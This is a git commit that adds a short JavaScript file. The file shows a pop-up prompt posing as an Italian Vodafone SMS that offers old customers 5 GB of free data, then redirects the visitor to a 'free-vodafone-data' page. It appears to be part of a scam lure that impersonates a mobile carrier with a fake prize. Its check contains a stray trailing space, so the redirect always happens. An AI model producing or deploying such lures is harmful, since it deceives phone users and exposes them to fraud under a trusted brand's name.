a5d37dcb10f961d78fa7d2eb4aa29ad0c4bbe4a5
ekpesense <abantak9@gmail.com>
2025-02-11 21:18:44 -0800

    Create activation-vodafone-data.js

---
+++ activation-vodafone-data.js
@@ -0,0 +1,5 @@
+var password = 'Premio Vodafone'
+password=prompt('SMS: Gentile Cliente, Controlla la tua SIM Vodafone è ideale per ricevere 5 GB di dati illimitati, premio per vecchi clienti, premi Ok per l'attivazione ora.','Premio Vodafone');
+if (password != 'Premio Vodafone ') {
+location.href='free-vodafone-data.html';
+}
